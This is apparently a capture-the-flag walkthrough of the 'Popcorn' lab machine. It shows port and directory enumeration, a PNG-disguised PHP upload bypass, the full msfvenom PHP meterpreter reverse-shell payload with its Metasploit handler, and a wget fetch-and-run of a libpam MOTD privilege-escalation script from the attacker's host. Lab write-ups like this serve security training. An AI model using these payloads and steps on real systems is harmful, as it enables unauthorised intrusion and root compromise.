# Popcorn Box

</br>

## Summary

* Enumeration: `nmap / dirb`
* WebApp analysis: `TorrentHoster`
* ReverseShell upload: `msfvenom && msf handler`
* MOTD exploit: `searchsploit`

</br>

## Step #1

```sh
$ nmap -sV -sC -oA nmap 10.10.10.6
```
```
# Nmap 7.70 scan initiated Tue Jun  5 12:13:00 2018 as: nmap -sV -sC -oA nmap 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  5 12:13:16 2018 -- 1 IP address (1 host up) scanned in 16.05 seconds
```

```bash
$ dirb http://10.10.10.6 -r -o dirb
```
```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb
START_TIME: Tue Jun  5 12:17:35 2018
URL_BASE: http://10.10.10.6/
WORDLIST_FILES: /usr/local/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.6/ ----
==> DIRECTORY: http://10.10.10.6/.ssh/
+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)
+ http://10.10.10.6/index (CODE:200|SIZE:177)
+ http://10.10.10.6/index.html (CODE:200|SIZE:177)
+ http://10.10.10.6/server-status (CODE:403|SIZE:291)
+ http://10.10.10.6/test (CODE:200|SIZE:47328)
==> DIRECTORY: http://10.10.10.6/torrent/

-----------------
END_TIME: Tue Jun  5 12:26:21 2018
DOWNLOADED: 4612 - FOUND: 5
```

### Results:

* A Apache HTTP server is runnning on port 80
* This server serve a WebApp named TorrentHoster on url `http://10.10.10.6/torrent`

</br>

## Step #2

Now, it will be necessarry to analyze the web app to find security vulnerability such as a incorrect file upload.

* Try default password on login: `Fail`

* Sign-up to get access to upload functionality

* Login with user just created

* Upload a php file: `Fail`

* Upload a torrent: `Success`

* Go to the description page of the torrent uploaded: screenshot upload field available

* Try to upload a image first: `Success`

* Locate the image uploaded: `http://10.10.10.6/torrent/upload`

* Try to upload a `php` file: `Fail`

* Modify the request using Burp repeater with adding PNG identifier get on the previous upload and add `.png` on the filename.

  ``````
  Content-Disposition: form-data; name="file"; filename="back.png.php"
  Content-Type: image/png
  
  �PNG
  
  IHDRnZY�c@ sBIT | d�<?php [REVSHELL CODE] die();
  ``````

**Reminder:**

To check the "identifier" of a file:

* Select a piece of the begining of the file in the body section of the request

* Convert to base64 using Burp

* Check the type of the file with the command `file`

  ````````````bash
  $ echo "iVBORw0KGgoAAAANSUhEUgAAAG4AAABaCAYAAABZsGNAAAAABHNCSVQICAgIfAhkiAAAAA==" | gbase64 -d > file
  $ file file
  file: PNG image data, 110 x 90, 8-bit/color RGBA, non-interlaced
  ````````````

</br>

## Step #3

We know now how to upload a php file by bypassing upload security. We will concequently try to upload a meterpreter.

1. Generate `php` file:

```sh
$ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.X.X lport=4242 -f raw
```

```
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1111 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.X.X'; $port = 4242; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

2. Upload it on TorrentHoster with the technique describe previously
3. Start a meterpreter handler

```sh
$ msfconsole
msf> use exploit/multi/handler
msf> set payload php/meterpreter/reverse_tcp
msf> set lhost 10.10.X.X
msf> set lport 4242
msf> run
```

4. Go to `http://10.10.10.6/torrent/upload` and click on the `php` just uploaded

5. Success, we have got a meterpreter shell to the box

   ``````
   meterpreter> shell
   ls /home
   george
   cat /home/george/user.txt
   *******HASH**********
   ``````

6. ???

7. PROFIT

</br>

## Step #4

It is time to perform a privilege escalation on this box

* In `.cache` folder of george home we can find a motd file

* A [exploit](https://www.exploit-db.com/exploits/14339/) of MOTD is available on ExploitDB for a libpam <= 1.1.0 

* Check the version of libpam on popcorn: `Vulnerable`

  ``````sh
  $ dpkg -l | grep pam
  ``````

* Upload exploit script to the machine using python HTTP server

  ``````sh
  attacker$ python -m SimpleHTTPServer 4242
  popcorn$ cd /dev/shm
  popcorn$ wget http://10.10.X.X:4242/privesc.sh
  popcorp$ chmod +x privesc.sh
  popcorn$ ./privesc.sh
  [...]
  root$ cat /root/root.txt
  ******HASH********
  ``````

  

